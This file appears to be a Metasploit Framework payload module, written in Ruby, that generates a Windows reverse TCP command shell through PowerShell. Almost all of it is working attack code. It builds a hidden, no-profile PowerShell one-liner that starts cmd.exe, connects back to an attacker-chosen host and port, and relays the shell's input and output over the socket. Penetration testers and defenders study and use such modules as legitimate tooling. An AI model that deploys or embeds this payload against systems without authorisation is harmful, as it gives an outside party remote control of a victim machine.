##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 1588

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Command Shell, Reverse TCP (via Powershell)',
        'Description' => 'Connect back and create a command shell via Powershell',
        'Author' => [
          'Dave Kennedy', # Original payload from trustedsec on SET
          'Ben Campbell' # Metasploit module
        ],
        'References' => [
          ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']
        ],
        # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'powershell',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('PowerShellPath', [true, 'The path to the PowerShell executable', 'powershell'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    powershell = %^
$a='#{lhost}';
$b=#{lport};
$c=New-Object system.net.sockets.tcpclient;
$nb=New-Object System.Byte[] $c.ReceiveBufferSize;
$ob=New-Object System.Byte[] 65536;
$eb=New-Object System.Byte[] 65536;
$e=new-object System.Text.UTF8Encoding;
$p=New-Object System.Diagnostics.Process;
$p.StartInfo.FileName='cmd.exe';
$p.StartInfo.RedirectStandardInput=1;
$p.StartInfo.RedirectStandardOutput=1;
$p.StartInfo.RedirectStandardError=1;
$p.StartInfo.UseShellExecute=0;
$q=$p.Start();
$is=$p.StandardInput;
$os=$p.StandardOutput;
$es=$p.StandardError;
$osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);
$esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);
$c.connect($a,$b);
$s=$c.GetStream();
while ($true) {
    start-sleep -m 100;
    if ($osread.IsCompleted -and $osread.Result -ne 0) {
      $r=$os.BaseStream.EndRead($osread);
      $s.Write($ob,0,$r);
      $s.Flush();
      $osread=$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);
    }
    if ($esread.IsCompleted -and $esread.Result -ne 0) {
      $r=$es.BaseStream.EndRead($esread);
      $s.Write($eb,0,$r);
      $s.Flush();
      $esread=$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);
    }
    if ($s.DataAvailable) {
      $r=$s.Read($nb,0,$nb.Length);
      if ($r -lt 1) {
          break;
      } else {
          $str=$e.GetString($nb,0,$r);
          $is.write($str);
      }
    }
    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) {
        break;
    }
    if ($p.ExitCode -ne $null) {
        break;
    }
}
^.gsub!("\n", '')

    "#{datastore['PowerShellPath']} -w hidden -nop -c #{powershell}"
  end
end
